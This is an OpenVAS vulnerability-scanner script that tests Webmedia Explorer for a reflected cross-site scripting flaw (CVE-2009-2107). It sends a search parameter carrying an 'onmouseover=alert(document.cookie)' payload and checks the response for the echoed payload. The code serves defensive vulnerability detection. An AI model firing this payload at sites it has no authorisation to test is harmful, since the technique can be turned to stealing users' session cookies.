###############################################################################
# OpenVAS Vulnerability Test
# $Id: webmedia_explorer_xss.nasl 9042 2018-03-07 12:12:57Z cfischer $
#
# Webmedia Explorer Multiple Cross Site Scripting Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:webmediaexplorer:webmedia_explorer";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100225");
  script_version("$Revision: 9042 $");
  script_tag(name:"last_modification", value:"$Date: 2018-03-07 13:12:57 +0100 (Wed, 07 Mar 2018) $");
  script_tag(name:"creation_date", value:"2009-06-21 16:51:00 +0200 (Sun, 21 Jun 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2009-2107");
  script_bugtraq_id(35368);
  script_name("Webmedia Explorer Multiple Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("webmedia_explorer_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("WebmediaExplorer/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35368");

  tag_summary = "Webmedia Explorer is prone to multiple cross-site scripting
  vulnerabilities because it fails to sufficiently sanitize
  user-supplied data.";

  tag_impact = "An attacker may leverage these issues to execute arbitrary script
  code in the browser of an unsuspecting user in the context of the
  affected site. This may allow the attacker to steal cookie-based
  authentication credentials and to launch other attacks.";

  tag_affected = "Webmedia Explorer 5.0.9 and 5.10.0 are vulnerable; other versions
  may also be affected.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = string( dir, "/index.php?search=%22%20onmouseover=alert(document.cookie)%20---" );
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( isnull( buf ) ) exit( 0 );

if( buf =~ "^HTTP/1\.[01] 200" && egrep( pattern:"<a href=.*onmouseover=alert\(document\.cookie\) ---", string:buf ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
